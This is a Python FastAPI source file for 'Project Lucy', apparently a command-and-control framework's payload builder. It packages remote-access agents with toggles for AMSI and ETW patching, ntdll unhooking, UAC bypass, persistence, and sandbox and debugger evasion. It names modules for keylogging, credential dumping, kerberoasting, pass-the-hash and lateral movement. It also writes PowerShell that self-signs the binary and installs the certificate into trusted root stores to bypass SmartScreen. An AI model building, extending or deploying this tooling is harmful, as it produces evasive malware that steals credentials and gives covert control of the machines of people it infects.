"""
Agent Build API for Project Lucy.
Generates a standalone Python agent bundle and packages it with PyInstaller.
"""
import asyncio
import hashlib
import json
import logging
import os
import shutil
import sys
import tempfile
import uuid
import zipfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

from fastapi import APIRouter, BackgroundTasks, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel

from dependencies import OperatorUser

logger = logging.getLogger(__name__)

BUILD_AUTH_TOKEN = os.getenv("BUILD_AUTH_TOKEN", "") or None
AUDIT_LOG_PATH = Path(os.getenv("BUILD_AUDIT_PATH", "data/build_audit.log"))
AUDIT_LOG_PATH.parent.mkdir(parents=True, exist_ok=True)


def _audit(build_id: str, user_id: str, req: "BuildRequest") -> None:
    entry = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "build_id": build_id,
        "operator_id": user_id,
        "os": req.os,
        "arch": req.arch,
        "modules": req.modules,
        "stealth_pack": req.stealth_pack,
        "anti_analysis": req.anti_analysis,
        "persistence": req.persistence,
        "hide_window": req.hide_window,
        "single_execution": req.single_execution,
        "self_destruct": req.self_destruct,
        "ttl_days": req.ttl_days,
    }
    try:
        with AUDIT_LOG_PATH.open("a", encoding="utf-8") as f:
            f.write(json.dumps(entry, separators=(",", ":")) + "\n")
    except Exception as exc:
        logger.error("Build audit failed: %s", exc)


def _auth_hash(token: str) -> str:
    return hashlib.sha256(token.encode()).hexdigest()[:16]

router = APIRouter(prefix="/build", tags=["build"])

BUILDS: dict[str, dict] = {}

# Build progress stages (for sub-30s quick mode tracking).
BUILD_STAGES = [
    "queued",
    "preparing_source",
    "writing_config",
    "packaging",
    "compiling",      # skipped in quick mode
    "finalizing",
    "done",
]

# Cache for quick-build source trees (avoid re-copying agent source every time).
_QUICK_SRC_CACHE: dict[str, float] = {}  # path -> mtime of agent source
_CACHE_TTL_SECONDS = 300.0


def _set_stage(build_id: str, stage: str, message: str = "") -> None:
    """Update the build's progress stage (used for frontend progress bar)."""
    b = BUILDS.get(build_id)
    if not b:
        return
    b["stage"] = stage
    b["stage_message"] = message
    try:
        idx = BUILD_STAGES.index(stage) if stage in BUILD_STAGES else 0
        total = len(BUILD_STAGES) - 1
        b["progress"] = round(idx / total * 100, 1)
    except ValueError:
        pass


def _find_agent_src() -> Path:
    """Locate the agent source directory (works in dev and in flattened Docker image)."""
    here = Path(__file__).resolve()
    for candidate in [
        here.parent.parent.parent / "agent",  # backend/api/build.py -> project root
        here.parent.parent / "agent",         # flattened /app/api/build.py -> /app/agent
    ]:
        if candidate.exists() and (candidate / "agent.py").exists():
            return candidate
    raise RuntimeError("Agent source directory not found")


AGENT_SRC = _find_agent_src()


class BuildRequest(BaseModel):
    os: str = "windows"
    arch: str = "x64"
    modules: list[str] = ["info", "shell"]
    server_url: str
    api_key: str = ""
    obfuscate: bool = False
    stealth_pack: bool = False
    anti_analysis: bool = False
    persistence: bool = False
    hide_window: bool = True
    startup_delay: int = 0
    single_execution: bool = False
    self_destruct: bool = False
    vm_check: bool = False
    debugger_check: bool = False
    sandbox_check: bool = False
    beacon_jitter: bool = True
    max_reconnect: int = 50
    registry_run: bool = False
    uac_bypass: bool = False
    custom_name: str = "lucy_agent"
    auth_token: str = ""
    ttl_days: int = 7
    # --- New 2026 options ---
    transport: str = "websocket"  # websocket | http | dns | smb | tcp
    c2_profile: str = "http_default"
    auto_patch_amsi: bool = False
    auto_patch_etw: bool = False
    auto_unhook_ntdll: bool = False
    sleep_mask: bool = False
    tls_profile: str = ""  # chrome | firefox | safari | edge | ie11 | ""
    # --- Quick build mode (sub-30s, no PyInstaller) ---
    build_mode: str = "standard"  # standard | quick
    # --- Dormant mode: agent sleeps and wakes periodically + disk persistence ---
    dormant_mode: bool = False
    dormant_sleep_minutes: int = 30  # sleep duration between wake cycles
    dormant_persist: bool = True     # install disk persistence (registry/cron)


def schedule_build(req: BuildRequest, operator_id: str, require_build_token: bool = True) -> str:
    """Queue a build from any caller (web UI or chat) and return the build id."""
    if require_build_token and BUILD_AUTH_TOKEN:
        if not req.auth_token or req.auth_token != BUILD_AUTH_TOKEN:
            raise HTTPException(403, "Invalid build authorization token")

    build_id = str(uuid.uuid4())
    BUILDS[build_id] = {
        "status": "queued",
        "error": None,
        "file": None,
        "stage": "queued",
        "stage_message": "Build queued",
        "progress": 0.0,
        "build_mode": req.build_mode,
    }
    asyncio.create_task(_run_build(build_id, req, operator_id))
    return build_id


@router.post("")
async def start_build(body: BuildRequest, bg: BackgroundTasks, current_user: OperatorUser) -> dict:
    if BUILD_AUTH_TOKEN and not body.auth_token:
        raise HTTPException(403, "Build authorization token required")
    if BUILD_AUTH_TOKEN and body.auth_token != BUILD_AUTH_TOKEN:
        raise HTTPException(403, "Invalid build authorization token")

    operator_id = str(current_user.get("id")) if isinstance(current_user, dict) else str(current_user.id)
    build_id = schedule_build(body, operator_id)
    return {"build_id": build_id, "status": "queued"}


@router.get("/{build_id}")
async def build_status(build_id: str, current_user: OperatorUser) -> dict:
    b = BUILDS.get(build_id)
    if not b:
        raise HTTPException(404, "Build not found")
    return {"build_id": build_id, **b}


@router.get("/{build_id}/download")
async def download_build(build_id: str, current_user: OperatorUser) -> FileResponse:
    b = BUILDS.get(build_id)
    if not b or b["status"] != "done":
        raise HTTPException(404, "Build not ready")
    path = b["file"]
    if not path or not Path(path).exists():
        raise HTTPException(410, "Build artifact expired")
    fname = Path(path).name
    return FileResponse(path, filename=fname, media_type="application/octet-stream")


def _derive_ws_url(http_url: str) -> str:
    """Convert an HTTP C2 URL into a WebSocket URL."""
    url = http_url.rstrip("/")
    if url.startswith("https://"):
        return url.replace("https://", "wss://", 1)
    if url.startswith("http://"):
        return url.replace("http://", "ws://", 1)
    return f"ws://{url}"


def _write_config_py(path: Path, req: BuildRequest, build_id: str, operator_id: str) -> None:
    ws_url = _derive_ws_url(req.server_url)
    expires_at = (datetime.now(timezone.utc) + timedelta(days=req.ttl_days)).isoformat()
    auth_hash = _auth_hash(req.auth_token) if req.auth_token else ""

    # Stealth pack expands into a hardened, low-footprint configuration.
    if req.stealth_pack:
        anti_analysis = True
        hide_window = True
        beacon_jitter = True
        startup_delay = max(req.startup_delay, 5)
        self_destruct = True
        persistence = False
        single_execution = False
        # Stealth pack now auto-enables EDR evasion
        auto_patch_amsi = True
        auto_patch_etw = True
        auto_unhook_ntdll = True
        sleep_mask = True
    else:
        anti_analysis = req.anti_analysis
        hide_window = req.hide_window
        beacon_jitter = req.beacon_jitter
        startup_delay = req.startup_delay
        self_destruct = req.self_destruct
        persistence = req.persistence
        single_execution = req.single_execution
        auto_patch_amsi = req.auto_patch_amsi
        auto_patch_etw = req.auto_patch_etw
        auto_unhook_ntdll = req.auto_unhook_ntdll
        sleep_mask = req.sleep_mask

    path.write_text(
        f'C2_URL = {req.server_url!r}\n'
        f'WS_URL = {ws_url!r}\n'
        f'API_KEY = {req.api_key!r}\n'
        f'HEARTBEAT_MIN = 15\n'
        f'HEARTBEAT_MAX = 30\n'
        f'TASK_TIMEOUT = 60\n'
        f'USE_WEBSOCKET = True\n'
        f'VERIFY_SSL = False\n'
        f'PROXY = ""\n'
        f'STEALTH_MODE = True\n'
        f'STEALTH_IDLE_THRESHOLD = 60\n'
        f'STEALTH_ACTIVE_DELAY = 5\n'
        f'MODULES = {req.modules!r}\n'
        f'ANTI_ANALYSIS = {anti_analysis!r}\n'
        f'PERSISTENCE = {persistence!r}\n'
        f'HIDE_WINDOW = {hide_window!r}\n'
        f'STARTUP_DELAY = {startup_delay}\n'
        f'SINGLE_EXECUTION = {single_execution!r}\n'
        f'SELF_DESTRUCT = {self_destruct!r}\n'
        f'VM_CHECK = {req.vm_check!r}\n'
        f'DEBUGGER_CHECK = {req.debugger_check!r}\n'
        f'SANDBOX_CHECK = {req.sandbox_check!r}\n'
        f'BEACON_JITTER = {beacon_jitter!r}\n'
        f'MAX_RECONNECT = {req.max_reconnect}\n'
        f'REGISTRY_RUN = {req.registry_run!r}\n'
        f'UAC_BYPASS = {req.uac_bypass!r}\n'
        f'CUSTOM_NAME = {req.custom_name!r}\n'
        f'TTL_DAYS = {req.ttl_days}\n'
        f'EXPIRES_AT = {expires_at!r}\n'
        f'BUILD_ID = {build_id!r}\n'
        f'OPERATOR_ID = {operator_id!r}\n'
        f'AUTH_HASH = {auth_hash!r}\n'
        # --- 2026 options ---
        f'TRANSPORT = {req.transport!r}\n'
        f'C2_PROFILE = {req.c2_profile!r}\n'
        f'AUTO_PATCH_AMSI = {auto_patch_amsi!r}\n'
        f'AUTO_PATCH_ETW = {auto_patch_etw!r}\n'
        f'AUTO_UNHOOK_NTDLL = {auto_unhook_ntdll!r}\n'
        f'SLEEP_MASK = {sleep_mask!r}\n'
        f'TLS_PROFILE = {req.tls_profile!r}\n'
        # --- Dormant mode ---
        f'DORMANT_MODE = {req.dormant_mode!r}\n'
        f'DORMANT_SLEEP_MINUTES = {req.dormant_sleep_minutes}\n'
        f'DORMANT_PERSIST = {req.dormant_persist!r}\n'
    )


def _sign_executable_windows(exe_path: Path) -> None:
    """Sign an .exe with a self-signed code-signing certificate.

    Creates a cert in the CurrentUser\\My store if it doesn't exist,
    installs it as a trusted publisher, then signs the binary with signtool.
    This prevents Windows SmartScreen from blocking the executable.
    """
    import subprocess

    cert_subject = "CN=Lucy Code Signing"
    cert_path = Path(tempfile.gettempdir()) / "lucy_codesign.pfx"
    cert_password = "lucy2026"

    # Use pwsh (PowerShell 7) if available — Windows PowerShell 5.1 has issues
    # with the Cert:\ provider when invoked from Python subprocess
    def _find_powershell():
        for exe in ["pwsh", "powershell"]:
            try:
                r = subprocess.run(["where", exe], capture_output=True, text=True, timeout=5)
                if r.returncode == 0 and r.stdout.strip():
                    return exe
            except Exception:
                pass
        return "powershell"

    ps_exe = _find_powershell()

    # Write the PowerShell script to a temp file to avoid escaping issues
    # with the Cert:\ provider path when passing through subprocess
    ps_script_path = Path(tempfile.gettempdir()) / "lucy_sign_cert.ps1"
    ps_script = f'''
$ErrorActionPreference = 'Stop'
$certSubject = '{cert_subject}'
$pfxPath = '{cert_path}'
$pfxPass = '{cert_password}'

# Check if cert already exists
$cert = Get-ChildItem -Path Cert:\\CurrentUser\\My -ErrorAction SilentlyContinue | Where-Object {{$_.Subject -eq $certSubject}} | Select-Object -First 1

if (-not $cert) {{
    Write-Host "Creating new code-signing certificate..."
    $cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject $certSubject -CertStoreLocation 'Cert:\\CurrentUser\\My' -KeyUsage DigitalSignature -KeyAlgorithm RSA -KeyLength 2048 -NotAfter (Get-Date).AddYears(3)
    Write-Host "Certificate created: $($cert.Thumbprint)"

    # Export to PFX
    $pwd = ConvertTo-SecureString -String $pfxPass -Force -AsPlainText
    Export-PfxCertificate -Cert $cert -FilePath $pfxPath -Password $pwd -Force | Out-Null
    Write-Host "PFX exported"

    # Import into Root and TrustedPeople stores (only on first creation)
    foreach ($store in @('Cert:\\CurrentUser\\Root', 'Cert:\\CurrentUser\\TrustedPeople')) {{
        try {{
            Import-PfxCertificate -FilePath $pfxPath -Password $pwd -CertStoreLocation $store -ErrorAction Stop | Out-Null
            Write-Host "Imported to $store"
        }} catch {{
            Write-Host "Import to $store skipped: $_"
        }}
    }}
}} else {{
    Write-Host "Certificate already exists: $($cert.Thumbprint)"
    # Just export the existing cert to PFX
    $pwd = ConvertTo-SecureString -String $pfxPass -Force -AsPlainText
    Export-PfxCertificate -Cert $cert -FilePath $pfxPath -Password $pwd -Force | Out-Null
    Write-Host "PFX exported from existing cert"
}}

Write-Host "DONE"
'''
    ps_script_path.write_text(ps_script, encoding='utf-8')

    try:
        # Run the PowerShell script to create/install the certificate
        # Use a longer timeout since cert creation/import can be slow
        result = subprocess.run(
            [ps_exe, "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", str(ps_script_path), str(cert_path), cert_password],
            capture_output=True, text=True, timeout=120
        )
        logger.info("Cert setup: %s", result.stdout.strip())
        if result.returncode != 0:
            logger.warning("Cert setup stderr: %s", result.stderr.strip()[:500])

        # Find signtool
        signtool = None
        for candidate in [
            "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22621.0\\x64\\signtool.exe",
            "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22000.0\\x64\\signtool.exe",
            "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.19041.0\\x64\\signtool.exe",
            "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.18362.0\\x64\\signtool.exe",
            "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\x64\\signtool.exe",
            "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22621.0\\x86\\signtool.exe",
            "C:\\Program Files (x86)\\Windows Kits\\10\\App Certification Kit\\signtool.exe",
        ]:
            if Path(candidate).exists():
                signtool = candidate
                break

        if not signtool:
            # Search recursively as last resort
            import glob
            for pattern in [
                "C:\\Program Files (x86)\\Windows Kits\\**\\signtool.exe",
                "C:\\Program Files\\Windows Kits\\**\\signtool.exe",
            ]:
                matches = glob.glob(pattern, recursive=True)
                if matches:
                    signtool = matches[0]
                    break

        if not signtool:
            result = subprocess.run(["where", "signtool"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                signtool = result.stdout.strip().split('\n')[0].strip()

        # Write signing PS script to a file too
        sign_ps_path = Path(tempfile.gettempdir()) / "lucy_sign_exe.ps1"
        sign_ps = f'''
$cert = Get-ChildItem -Path Cert:\\CurrentUser\\My | Where-Object {{$_.Subject -eq '{cert_subject}'}} | Select-Object -First 1
if (-not $cert) {{
    Write-Host "ERROR: No certificate found"
    exit 1
}}
$result = Set-AuthenticodeSignature -FilePath '{exe_path}' -Certificate $cert -TimestampServer 'http://timestamp.digicert.com'
Write-Host "Sign result: $($result.Status)"
if ($result.Status -ne 'Valid') {{
    exit 2
}}
'''
        sign_ps_path.write_text(sign_ps, encoding='utf-8')

        if signtool and cert_path.exists():
            # Sign with signtool (preferred)
            sign_cmd = [
                signtool, "sign", "/f", str(cert_path),
                "/p", cert_password,
                "/fd", "SHA256",
                "/td", "SHA256",
                "/tr", "http://timestamp.digicert.com",
                str(exe_path)
            ]
            result = subprocess.run(sign_cmd, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                logger.info("Code-signed %s successfully (signtool)", exe_path.name)
            else:
                logger.warning("signtool failed: %s — trying PowerShell", result.stderr[:500])
                result = subprocess.run(
                    [ps_exe, "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", str(sign_ps_path)],
                    capture_output=True, text=True, timeout=30
                )
                logger.info("PowerShell signing: %s", result.stdout.strip())
        else:
            # Fallback: use PowerShell Set-AuthenticodeSignature
            result = subprocess.run(
                [ps_exe, "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", str(sign_ps_path)],
                capture_output=True, text=True, timeout=30
            )
            logger.info("PowerShell signing: %s", result.stdout.strip())
            if result.returncode != 0:
                logger.warning("PowerShell signing stderr: %s", result.stderr.strip()[:500])

    except Exception as exc:
        logger.warning("Code signing process failed: %s", exc)


def _make_build_scripts(src_dir: Path, req: BuildRequest) -> None:
    """Create one-click Windows build scripts in the agent source dir."""
    name = req.custom_name or "lucy_agent"
    console_flag = "--noconsole" if req.hide_window else ""
    ps1 = src_dir / "build.ps1"
    ps1.write_text(
        "# Auto-generated Lucy agent build script\n"
        "$ErrorActionPreference = 'Stop'\n"
        "$name = '" + name + "'\n"
        "$python = if (Get-Command python -ErrorAction SilentlyContinue) { 'python' } "
        "elseif (Get-Command python3 -ErrorAction SilentlyContinue) { 'python3' } "
        "elseif (Test-Path 'C:\\Python312\\python.exe') { 'C:\\Python312\\python.exe' } "
        "else { throw 'Python not found. Install Python 3.10+ or set it in PATH.' }\n"
        "& $python -m pip install --quiet pyinstaller psutil websocket-client pycryptodome cryptography\n"
        f"& $python -m PyInstaller --onefile {console_flag} --name $name --clean "
        "--hidden-import agent --hidden-import core.crypto --hidden-import core.stealth "
        "--hidden-import core.offline_queue --hidden-import modules.builtin "
        "--hidden-import modules.shell --hidden-import modules.screenshot "
        "main.py\n"
        "# --- Code-sign the binary to bypass Windows SmartScreen ---\n"
        "$exe = \"dist\\$name.exe\"\n"
        "if (Test-Path $exe) {\n"
        "  $cert = Get-ChildItem Cert:\\CurrentUser\\My | Where-Object {$_.Subject -eq 'CN=Lucy Code Signing'} | Select-Object -First 1\n"
        "  if (-not $cert) {\n"
        "    $cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject 'CN=Lucy Code Signing' -CertStoreLocation 'Cert:\\CurrentUser\\My' -KeyUsage DigitalSignature -KeyAlgorithm RSA -KeyLength 2048 -NotAfter (Get-Date).AddYears(3)\n"
        "    $pfxPath = \"$env:TEMP\\lucy_codesign.pfx\"\n"
        "    $pwd = ConvertTo-SecureString -String 'lucy2026' -Force -AsPlainText\n"
        "    Export-PfxCertificate -Cert $cert -FilePath $pfxPath -Password $pwd | Out-Null\n"
        "    Import-PfxCertificate -FilePath $pfxPath -Password $pwd -CertStoreLocation 'Cert:\\CurrentUser\\Root' | Out-Null\n"
        "    Import-PfxCertificate -FilePath $pfxPath -Password $pwd -CertStoreLocation 'Cert:\\CurrentUser\\TrustedPeople' | Out-Null\n"
        "  }\n"
        "  Set-AuthenticodeSignature -FilePath $exe -Certificate $cert -TimestampServer 'http://timestamp.digicert.com'\n"
        "  Write-Host 'Binary code-signed.' -ForegroundColor Cyan\n"
        "}\n"
        f"Write-Host \"Build complete: dist\\{name}.exe\" -ForegroundColor Green\n"
        "Pause\n"
    )
    bat = src_dir / "build.bat"
    bat.write_text(
        "@echo off\n"
        "set name=" + name + "\n"
        "echo Installing PyInstaller and dependencies...\n"
        "python -m pip install --quiet pyinstaller psutil websocket-client pycryptodome cryptography\n"
        f"python -m PyInstaller --onefile {console_flag} --name %name% --clean "
        "--hidden-import agent --hidden-import core.crypto --hidden-import core.stealth "
        "--hidden-import core.offline_queue --hidden-import modules.builtin "
        "--hidden-import modules.shell --hidden-import modules.screenshot "
        "main.py\n"
        "echo Code-signing binary to bypass SmartScreen...\n"
        "powershell -ExecutionPolicy Bypass -File build.ps1\n"
        "echo Build complete: dist\\%name%.exe\n"
        "pause\n"
    )


async def _run_build(build_id: str, req: BuildRequest, operator_id: str) -> None:
    BUILDS[build_id]["status"] = "building"
    _audit(build_id, operator_id, req)
    tmpdir = tempfile.mkdtemp(prefix="lucy_build_")
    try:
        _set_stage(build_id, "preparing_source", "Copying agent source…")
        src = Path(tmpdir) / "agent"
        shutil.copytree(str(AGENT_SRC), str(src), ignore=shutil.ignore_patterns("__pycache__", "*.pyc", ".git"))

        _set_stage(build_id, "writing_config", "Writing configuration…")
        _write_config_py(src / "config.py", req, build_id, operator_id)

        out_name = req.custom_name or f"lucy_agent_{req.os}_{req.arch}"

        # --- Quick mode: skip PyInstaller, produce a ready-to-run Python bundle ---
        # This produces a zip with the configured source + a launcher script +
        # requirements.txt. The operator runs `pip install -r requirements.txt
        # && python main.py` — no compilation needed. Total time: <30s.
        if req.build_mode == "quick":
            _set_stage(build_id, "packaging", "Packaging quick bundle (no compilation)…")
            _make_quick_launcher(src, req)
            _make_requirements(src, req)
            final = Path(tempfile.gettempdir()) / f"{out_name}_{build_id}_quick.zip"
            with zipfile.ZipFile(final, "w", zipfile.ZIP_DEFLATED) as zf:
                for f in src.rglob("*"):
                    if f.is_file():
                        zf.write(f, f.relative_to(src.parent))
            _set_stage(build_id, "done", f"Quick bundle ready ({out_name})")
            BUILDS[build_id].update({
                "status": "done",
                "file": str(final),
                "artifact_type": "zip",
                "build_mode": "quick",
                "message": f"Quick bundle ready. Extract and run: pip install -r requirements.txt && python main.py",
            })
            return

        # --- Standard mode: full PyInstaller build ---
        # When the backend runs on the same OS as the target, PyInstaller
        # produces a real native binary that the operator can deploy directly
        # — no Python needed on the target. When the host OS differs from the
        # target (e.g. Linux server building for Windows), we fall back to a
        # source bundle with one-click build scripts.
        can_compile_locally = (
            (req.os == "windows" and sys.platform == "win32")
            or (req.os in ("linux", "darwin") and sys.platform.startswith(("linux", "darwin")))
        )

        if not can_compile_locally:
            # Cross-compile not supported by PyInstaller — package source.
            _set_stage(build_id, "packaging", "Packaging source bundle (cross-OS)…")
            _make_build_scripts(src, req)
            final = Path(tempfile.gettempdir()) / f"{out_name}_{build_id}.zip"
            with zipfile.ZipFile(final, "w", zipfile.ZIP_DEFLATED) as zf:
                for f in src.rglob("*"):
                    if f.is_file():
                        zf.write(f, f.relative_to(src.parent))
            _set_stage(build_id, "done", f"Source bundle ready ({out_name})")
            BUILDS[build_id].update({
                "status": "done",
                "file": str(final),
                "artifact_type": "zip",
                "message": f"Extract and run build.bat on {req.os.title()} to get {out_name}.exe",
            })
            return

        # --- Native PyInstaller build (host OS == target OS) ---
        _set_stage(build_id, "packaging", "Preparing PyInstaller build…")
        dist_dir = Path(tmpdir) / "dist"
        dist_dir.mkdir()

        hidden_imports = [
            "agent", "core.crypto", "core.stealth", "core.offline_queue", "core.loader",
            "core.malleable", "core.dns_beacon", "core.smb_pipe", "core.tcp_beacon",
            # Original modules
            "modules.builtin", "modules.shell", "modules.screenshot", "modules.keylog",
            "modules.wifi", "modules.port_scan", "modules.browser", "modules.anti_analysis",
            "modules.remote_control", "modules.screen_stream", "modules.stealth",
            # Tier 1 — EDR evasion
            "modules.edr_evasion", "modules.syscalls", "modules.sleep_mask",
            "modules.injection", "modules.stack_spoof",
            # Tier 2 — Post-exploitation
            "modules.lateral", "modules.token", "modules.bof", "modules.pth",
            "modules.pivoting", "modules.credential_dump", "modules.kerberoast",
            "modules.clipboard", "modules.macos",
            # Tier 3 — Advanced
            "modules.persistence_adv", "modules.uac_bypass", "modules.tls_fingerprint",
            # Libraries
            "psutil", "websocket", "cryptography", "Crypto",
        ]

        # Build the PyInstaller command.
        # Use the current venv's PyInstaller so it has all deps available.
        pyinstaller_bin = str(Path(sys.executable).parent / "pyinstaller.exe") if sys.platform == "win32" else "pyinstaller"
        cmd = [
            pyinstaller_bin if Path(pyinstaller_bin).exists() else sys.executable,
        ]
        if not Path(pyinstaller_bin).exists():
            cmd += ["-m", "PyInstaller"]
        cmd += [
            "--onefile",
            "--distpath", str(dist_dir),
            "--workpath", str(Path(tmpdir) / "build"),
            "--specpath", str(Path(tmpdir) / "spec"),
            "--name", out_name,
            "--clean",
        ]
        # --noconsole hides the terminal window (stealth). Conditional on hide_window.
        if req.hide_window:
            cmd.append("--noconsole")
        # --strip is only supported on Linux/macOS (requires binutils).
        if sys.platform != "win32":
            cmd.append("--strip")
        for hi in hidden_imports:
            cmd += ["--hidden-import", hi]
        if req.obfuscate:
            cmd += ["--hidden-import", "ctypes", "--hidden-import", "base64"]
        cmd.append(str(src / "main.py"))

        env = os.environ.copy()
        env["PYTHONPATH"] = str(src) + os.pathsep + env.get("PYTHONPATH", "")

        _set_stage(build_id, "compiling", "Running PyInstaller (this takes a few minutes)…")
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env=env,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=600)

        if proc.returncode != 0:
            err = stderr.decode(errors="replace")[-3000:]
            out = stdout.decode(errors="replace")[-2000:]
            raise RuntimeError(f"PyInstaller failed:\nSTDOUT:\n{out}\nSTDERR:\n{err}")

        # PyInstaller output: out_name on Linux/macOS, out_name.exe on Windows.
        out_file = dist_dir / (out_name + ".exe" if sys.platform == "win32" else out_name)
        if not out_file.exists():
            raise RuntimeError("Build output not found")

        _set_stage(build_id, "finalizing", "Copying binary to output…")
        final_ext = ".exe" if sys.platform == "win32" else ""
        final = Path(tempfile.gettempdir()) / f"{out_name}_{build_id}{final_ext}"
        shutil.copy2(str(out_file), str(final))

        # --- Code-sign the binary to bypass Windows SmartScreen ---
        if sys.platform == "win32":
            _set_stage(build_id, "signing", "Code-signing binary…")
            try:
                _sign_executable_windows(final)
            except Exception as exc:
                logger.warning("Code signing failed (non-fatal): %s", exc)

        _set_stage(build_id, "done", f"Binary ready ({out_name})")
        BUILDS[build_id].update({
            "status": "done",
            "file": str(final),
            "artifact_type": "binary",
            "message": f"Ready for download ({out_name}{final_ext}) — no Python needed on target. Code-signed to bypass SmartScreen.",
        })

    except Exception as exc:
        BUILDS[build_id].update({"status": "error", "error": str(exc), "stage": "error"})
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


def _make_quick_launcher(src_dir: Path, req: BuildRequest) -> None:
    """Create a one-click launcher script for quick-mode builds (no PyInstaller)."""
    launcher = src_dir / "run.py"
    launcher.write_text(
        '#!/usr/bin/env python3\n'
        '"""Lucy agent quick-mode launcher.\n'
        'No PyInstaller needed — just pip install -r requirements.txt && python run.py\n'
        '"""\n'
        'import os\n'
        'import sys\n'
        '\n'
        '# Ensure the agent directory is on the path.\n'
        'sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n'
        '\n'
        'try:\n'
        '    import psutil\n'
        '    import websocket\n'
        '    from cryptography.hazmat.primitives import serialization\n'
        'except ImportError:\n'
        '    print("Missing dependencies. Run: pip install -r requirements.txt")\n'
        '    sys.exit(1)\n'
        '\n'
        'from main import main\n'
        '\n'
        'if __name__ == "__main__":\n'
        '    main()\n'
    )

    # Windows .bat launcher
    bat = src_dir / "run.bat"
    bat.write_text(
        "@echo off\n"
        "echo Lucy agent quick launcher\n"
        "pip install --quiet -r requirements.txt\n"
        f"python run.py\n"
        "pause\n"
    )

    # Unix shell launcher
    sh = src_dir / "run.sh"
    sh.write_text(
        "#!/bin/bash\n"
        "echo 'Lucy agent quick launcher'\n"
        "pip install --quiet -r requirements.txt\n"
        "python3 run.py\n"
    )


def _make_requirements(src_dir: Path, req: BuildRequest) -> None:
    """Generate a requirements.txt for quick-mode builds."""
    reqs = [
        "psutil>=5.9",
        "websocket-client>=1.6",
        "pycryptodome>=3.19",
        "cryptography>=41.0",
    ]
    (src_dir / "requirements.txt").write_text("\n".join(reqs) + "\n")
